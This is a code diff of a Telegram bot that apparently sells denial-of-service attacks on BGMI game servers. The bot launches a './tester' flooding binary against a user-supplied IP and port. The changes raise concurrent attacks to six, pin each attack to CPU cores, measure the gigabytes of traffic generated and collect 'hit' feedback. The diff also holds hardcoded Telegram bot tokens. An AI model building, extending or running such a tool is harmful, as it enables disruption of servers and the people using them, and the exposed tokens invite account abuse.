@@ -13,6 +13,7 @@ import atexit
 import asyncio
 import threading
 import math
+import psutil  # Added for external network monitoring
 
 # Set up logging
 logging.basicConfig(level=logging.INFO)
@@ -21,17 +22,46 @@ logging.basicConfig(level=logging.INFO)
 MAX_ATTACK_DURATION = 120
 USER_ACCESS_FILE = "user_access.txt"
 ATTACK_LOG_FILE = "attack_log.txt"
-OWNER_ID = "6191432888"
-bot = telebot.TeleBot('7674857613:AAEpC3RZXZJRVuI4z4NbR08v80HlAPiA7A0')
+OWNER_ID = "6442837812"
+bot = telebot.TeleBot('7674857613:AAF1UfnPbRAvRPxA6_AU6Y0bE3qeKtIjbUo')
 
 # Global feedback counters and timestamp dictionaries
 feedback_count = {}
 feedback_sent_time = {}  # When feedback message was sent (in seconds since epoch)
-feedback_received = {}   # Tracks if feedback for a given user has already been received
+feedback_received = {}   # Tracks if feedback for a given attack has already been received
 
 # New global counters for overall feedback counts
 total_hit_count = 0
 total_not_hit_count = 0
+
+# ----------------------
+# NEW: Define CPU sets
+# ----------------------
+CPU_SETS = [
+    "0,6,12,18,24,30,36,42,45,51,57,63,69,75,81,87",
+    "1,7,13,19,25,31,37,43,46,52,58,64,70,76,82,88",
+    "2,8,14,20,26,32,38,44,47,53,59,65,71,77,83,89",
+    "3,9,15,21,27,33,39,48,54,60,66,72,78,84",
+    "4,10,16,22,28,34,40,49,55,61,67,73,79,85",
+    "5,11,17,23,29,35,41,50,56,62,68,74,80,86"
+]
+
+def get_available_cpu_set_index():
+    """
+    Returns the index of the first unused CPU set (0 to 5),
+    or None if all are currently in use by ongoing attacks.
+    """
+    used_indices = [
+        attack.get('cpu_set_index')
+        for attack in 
+        # Only consider attacks that haven't ended yet
+        active_attacks 
+        if attack['end_time'] > datetime.datetime.now()
+    ]
+    for i in range(len(CPU_SETS)):
+        if i not in used_indices:
+            return i
+    return None
 
 # Auto-convert backup file on first run
 if not os.path.exists(USER_ACCESS_FILE) and os.path.exists("user_access_backup.txt"):
@@ -74,6 +104,7 @@ user_cooldowns = {}
 active_attacks = []  # List of dictionaries with attack info
 user_command_count = defaultdict(int)
 last_command_time = {}
+
 attacks_lock = Lock()
 
 def save_persistent_data():
@@ -126,7 +157,8 @@ def save_active_attacks():
             'target': a['target'],
             'port': a['port'],
             'end_time': a['end_time'].isoformat(),
-            'message_id': a.get('message_id')
+            'message_id': a.get('message_id'),
+            'duration': a.get('duration', 0)
         } for a in active_attacks]
     with open('active_attacks.json', 'w') as f:
         json.dump(attacks_to_save, f)
@@ -183,7 +215,7 @@ def is_authorized(message):
     now = datetime.datetime.now()
     chat_id = str(message.chat.id)
     user_id = str(message.from_user.id)
-    # If in a group chat, check if the chat id (or fallback to user id) is granted access.
+    # For group chats, check chat id or user id in access
     if message.chat.type in ["group", "supergroup"]:
         if chat_id in user_access and user_access[chat_id] >= now:
             return True
@@ -191,10 +223,17 @@ def is_authorized(message):
             return True
         return False
     else:
-        # In a private chat, check user access only.
+        # For private chats, check user access only
         if user_id in user_access and user_access[user_id] >= now:
             return True
         return False
+
+# New function to get network usage for an interface
+def get_network_usage(interface):
+    stats = psutil.net_io_counters(pernic=True).get(interface)
+    if stats:
+        return stats.bytes_sent, stats.bytes_recv
+    return (0, 0)
 
 user_access = load_user_access()
 load_persistent_data()
@@ -211,10 +250,11 @@ async def async_update_countdown(message, msg_id, start_time, duration, caller_i
         if remaining <= 0:
             break
         try:
-            await loop.run_in_executor(None, lambda: bot.edit_message_text(
+            # Update the attack message caption every 5 seconds
+            await loop.run_in_executor(None, lambda: bot.edit_message_caption(
                 chat_id=message.chat.id,
                 message_id=msg_id,
-                text=f"""
+                caption=f"""
 ⚡️🔥 ATTACK DEPLOYED 🔥⚡️
 
 👑 Commander: `{caller_id}`
@@ -228,16 +268,26 @@ async def async_update_countdown(message, msg_id, start_time, duration, caller_i
             ))
         except Exception as e:
             logging.error(f"Async countdown update error: {e}")
-        await asyncio.sleep(1)
+        await asyncio.sleep(5)
+    # After the attack duration ends, compute network traffic if available
+    traffic_info = ""
+    if "baseline_stats" in attack_info:
+        interface = attack_info.get("network_interface", "eth0")
+        final_sent, final_recv = get_network_usage(interface)
+        baseline_sent, baseline_recv = attack_info.get("baseline_stats", (0, 0))
+        traffic_bytes = (final_sent - baseline_sent) + (final_recv - baseline_recv)
+        traffic_gb = traffic_bytes / (1024**3)
+        traffic_info = f"\n🚀 Traffic Generated: `{traffic_gb:.2f} GB`"
     try:
-         await loop.run_in_executor(None, lambda: bot.edit_message_text(
+        await loop.run_in_executor(None, lambda: bot.edit_message_caption(
             chat_id=message.chat.id,
             message_id=msg_id,
-            text=f"""
+            caption=f"""
 ✅ ATTACK COMPLETED ✅
 🎯 Target: `{target}`
 📡 Port: `{port}`
-⏳ Duration: `{duration} seconds`
+⏳ Duration: `{attack_info.get('duration')} seconds`
+{traffic_info}
 🔥 Attack finished successfully! 🔥
                 """,
             parse_mode='Markdown'
@@ -257,9 +307,13 @@ def ask_attack_feedback(user_id, chat_id):
     hit_button = types.InlineKeyboardButton("✅ Hit", callback_data=f"feedback_hit_{user_id}")
     not_hit_button = types.InlineKeyboardButton("❌ Not Hit", callback_data=f"feedback_not_{user_id}")
     stop_button = types.InlineKeyboardButton("⏹ Stop Attack", callback_data=f"feedback_stop_{user_id}")
-    # Arrange hit and not hit in one row, and stop attack on a new row.
+    # Arrange hit and not hit in one row.
     markup.row(hit_button, not_hit_button)
+    # Add stop attack in a new row.
     markup.add(stop_button)
+    # Add the new "Updates" button in a new row, linking to the specified channel.
+    updates_button = types.InlineKeyboardButton("Updates", url="https://t.me/+wPipVoNa-g01N2I1")
+    markup.add(updates_button)
     msg = bot.send_message(
         chat_id,
         f"<a href='tg://user?id={user_id}'>User</a>, did your attack hit?",
@@ -271,9 +325,11 @@ def ask_attack_feedback(user_id, chat_id):
 @bot.callback_query_handler(func=lambda call: call.data.startswith("feedback_"))
 def handle_feedback(call):
     data = call.data.split("_")
-    # Handle the "Stop Attack" callback
-    if call.data.startswith("feedback_stop_"):
-        expected_user_id = data[2]
+    action = data[1]  # "hit", "not", or "stop"
+    expected_user_id = data[2]
+    
+    # Handle the "Stop Attack" callback first.
+    if action == "stop":
         if str(call.from_user.id) != expected_user_id and str(call.from_user.id) != OWNER_ID:
             bot.answer_callback_query(call.id, "❌ You are not authorized to stop this attack.")
             return
@@ -295,64 +351,87 @@ def handle_feedback(call):
             if attack_to_stop in active_attacks:
                 active_attacks.remove(attack_to_stop)
         save_active_attacks()
+        # Compute traffic info and update the attack message caption to final "Attack Completed" format
+        traffic_info = ""
+        if "baseline_stats" in attack_to_stop:
+            interface = attack_to_stop.get("network_interface", "eth0")
+            final_sent, final_recv = get_network_usage(interface)
+            baseline_sent, baseline_recv = attack_to_stop.get("baseline_stats", (0, 0))
+            traffic_bytes = (final_sent - baseline_sent) + (final_recv - baseline_recv)
+            traffic_gb = traffic_bytes / (1024**3)
+            traffic_info = f"\n🚀 Traffic Generated: `{traffic_gb:.2f} GB`"
         try:
-            bot.edit_message_text(
+            bot.edit_message_caption(
                 chat_id=call.message.chat.id,
-                message_id=call.message.message_id,
-                text="Attack stopped."
+                message_id=attack_to_stop['message_id'],
+                caption=f"""
+✅ ATTACK COMPLETED ✅
+🎯 Target: `{attack_to_stop['target']}`
+📡 Port: `{attack_to_stop['port']}`
+⏳ Duration: `{attack_to_stop.get('duration')} seconds`
+{traffic_info}
+🔥 Attack finished successfully! 🔥
+                """,
+                parse_mode='Markdown'
             )
         except Exception as e:
-            logging.error("Error editing message after stopping attack: " + str(e))
+            logging.error("Error editing attack message after stopping attack: " + str(e))
         bot.answer_callback_query(call.id, "Attack stopped.")
         return
 
-    # Process Hit or Not Hit feedback
-    feedback = data[1]  # "hit" or "not"
-    expected_user_id = data[2]
-    if feedback_received.get(expected_user_id, False):
-        bot.answer_callback_query(call.id, "Feedback already received.")
-        return
+    # Process "Hit" or "Not Hit" feedback.
+    # Only allow the expected user or the owner to provide feedback.
     if str(call.from_user.id) != expected_user_id and str(call.from_user.id) != OWNER_ID:
-        bot.answer_callback_query(call.id, "❌ You are not authorized to provide feedback for this attack.")
+        bot.answer_callback_query(call.id, "You did not launch this attack, so you cannot provide feedback.")
         return
-    current_time = time.time()
-    sent_time = feedback_sent_time.get(expected_user_id)
-    if sent_time and (current_time - sent_time > 60):
-        bot.edit_message_text(
-            chat_id=call.message.chat.id,
-            message_id=call.message.message_id,
-            text="Feedback time expired. Please provide timely feedback next time."
-        )
-        bot.answer_callback_query(call.id, "Feedback time expired.")
+
+    # Look for an active attack for this expected user
+    attacker_attack = None
+    for attack in active_attacks:
+        if attack['user_id'] == expected_user_id and attack['end_time'] > datetime.datetime.now():
+            attacker_attack = attack
+            break
+
+    if attacker_attack is None:
+        bot.answer_callback_query(call.id, "No active attack found. You can only provide feedback while your attack is running.")
+        return
+
+    # Allow only one feedback per attack.
+    if attacker_attack.get("feedback_given", False):
+        bot.answer_callback_query(call.id, "Feedback already received for this attack.")
         return
 
     global feedback_count, total_hit_count, total_not_hit_count
-    if feedback == "not":
+    if action == "not":
         feedback_count[expected_user_id] = feedback_count.get(expected_user_id, 0) + 1
         total_not_hit_count += 1
-        result_text = f"Negative feedback recorded ({feedback_count[expected_user_id]}/7)."
+        feedback_text = "Not Hit"
     else:
         total_hit_count += 1
         feedback_count[expected_user_id] = 0
-        result_text = "Great! Feedback noted."
-    feedback_received[expected_user_id] = True
+        feedback_text = "Hit"
 
-    # Create a new markup with only the stop attack button remaining
+    # Mark feedback as given for this attack
+    attacker_attack["feedback_given"] = True
+
+    # Build new markup with stop attack and updates buttons
     markup = types.InlineKeyboardMarkup()
     stop_button = types.InlineKeyboardButton("⏹ Stop Attack", callback_data=f"feedback_stop_{expected_user_id}")
+    updates_button = types.InlineKeyboardButton("Updates", url="https://t.me/+wPipVoNa-g01N2I1")
     markup.add(stop_button)
+    markup.add(updates_button)
 
     try:
         bot.edit_message_text(
             chat_id=call.message.chat.id,
             message_id=call.message.message_id,
-            text=f"Feedback received: {'Hit' if feedback == 'hit' else 'Not Hit'}",
+            text=f"Feedback received: {feedback_text}",
             reply_markup=markup,
             parse_mode='Markdown'
         )
     except Exception as e:
         logging.error("Error editing feedback message: " + str(e))
-    bot.answer_callback_query(call.id, result_text)
+    bot.answer_callback_query(call.id, "Feedback recorded.")
 
 # ---------------------------
 # New Command: /stop_all to stop all running attacks (Owner only)
@@ -405,50 +484,98 @@ def handle_bgmi(message):
     if not is_authorized(message):
         bot.reply_to(message, "❌ You are not authorized to use this bot or your access has expired. Please contact an admin.")
         return
+
     caller_id = str(message.from_user.id)
     command = message.text.split()
     if len(command) != 4 or not command[3].isdigit():
         bot.reply_to(message, "Invalid format! Use: `/bgmi <target> <port> <duration>`", parse_mode='Markdown')
         return
+
     target, port, duration = command[1], command[2], int(command[3])
     if not is_valid_ip(target):
         bot.reply_to(message, "❌ Invalid target IP! Please provide a valid IP address.")
         return
+
     if not port.isdigit() or not (1 <= int(port) <= 65535):
         bot.reply_to(message, "❌ Invalid port! Please provide a port number between 1 and 65535.")
         return
+
     int_port = int(port)
     BLOCKED_PORTS = {17000, 17500, 20000, 20001, 20002}
     if int_port <= 10000 or int_port >= 30000 or int_port in BLOCKED_PORTS:
-         bot.reply_to(message, f"🚫 The port `{int_port}` is blocked! Please use a different port.")
-         return
+        bot.reply_to(message, f"🚫 The port `{int_port}` is blocked! Please use a different port.")
+        return
+
     if duration > MAX_ATTACK_DURATION:
         bot.reply_to(message, f"⚠️ Maximum attack duration is {MAX_ATTACK_DURATION} seconds.")
         return
+
     if caller_id in attack_limits and duration > attack_limits[caller_id]:
         bot.reply_to(message, f"⚠️ Your maximum allowed attack duration is {attack_limits[caller_id]} seconds.")
         return
+
+    # ---------------------------------------
+    # ALLOW UP TO 6 CONCURRENT ATTACKS
+    # ---------------------------------------
     current_active = [attack for attack in active_attacks if attack['end_time'] > datetime.datetime.now()]
-    if len(current_active) >= 1:
-        bot.reply_to(message, "🚨 Maximum of 1 concurrent attack allowed. Please wait for the current attack to finish before launching a new one.")
+    if len(current_active) >= 6:
+        bot.reply_to(message, "🚨 Maximum of 6 concurrent attacks allowed. Please wait for one to finish before launching a new one.")
         return
+
+    # ---------------------------------------
+    # PICK AN AVAILABLE CPU SET
+    # ---------------------------------------
+    cpu_set_index = get_available_cpu_set_index()
+    if cpu_set_index is None:
+        bot.reply_to(message, "🚨 All 6 CPU core sets are currently in use. Please wait for an existing attack to finish.")
+        return
+
+    selected_cpu_set = CPU_SETS[cpu_set_index]
+
     attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=duration)
-    attack_info = {'user_id': caller_id, 'target': target, 'port': port, 'end_time': attack_end_time}
+    attack_info = {
+        'user_id': caller_id,
+        'target': target,
+        'port': port,
+        'end_time': attack_end_time,
+        'duration': duration,
+        'cpu_set_index': cpu_set_index
+    }
+
+    # Record baseline network usage (using interface "eth0")
+    NETWORK_INTERFACE = "eth0"
+    attack_info["network_interface"] = NETWORK_INTERFACE
+    attack_info["baseline_stats"] = get_network_usage(NETWORK_INTERFACE)
+
+    # ---------------------------------------
+    # USE TASKSET TO PIN TO SPECIFIC CORES
+    # ---------------------------------------
     try:
-        proc = subprocess.Popen(["./tester", target, str(port), str(duration), "900"],
-                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        proc = subprocess.Popen(
+            [
+                "taskset", "-c", selected_cpu_set,
+                "./tester", target, str(port), str(duration), "900"
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
         attack_info["proc"] = proc
     except Exception as e:
         logging.error(f"Subprocess error: {e}")
         bot.reply_to(message, "🚨 An error occurred while executing the attack command.")
         return
+
     with attacks_lock:
         active_attacks.append(attack_info)
     save_active_attacks()
+
     log_attack(caller_id, target, port, duration)
-    msg = bot.send_message(
-        message.chat.id,
-        f"""
+
+    # Send the attack message + animation
+    msg = bot.send_animation(
+        chat_id=message.chat.id,
+        animation="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExcjR3ZHI1YnQ1bHU4OHBqN2I2M3N2eDVpdG8wNndjaDVvNXoyZDB3aSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/SsBz0oSJ1botYaLqAR/giphy.gif",
+        caption=f"""
 ⚡️🔥 ATTACK DEPLOYED 🔥⚡️
 
 👑 Commander: `{caller_id}`
@@ -462,10 +589,14 @@ def handle_bgmi(message):
     )
     attack_info['message_id'] = msg.message_id
     save_active_attacks()
+
+    # Update countdown asynchronously
     asyncio.run_coroutine_threadsafe(
         async_update_countdown(message, msg.message_id, datetime.datetime.now(), duration, caller_id, target, port, attack_info),
         async_loop
     )
+
+    # Ask for feedback
     ask_attack_feedback(caller_id, message.chat.id)
 
 @bot.message_handler(commands=['when'])
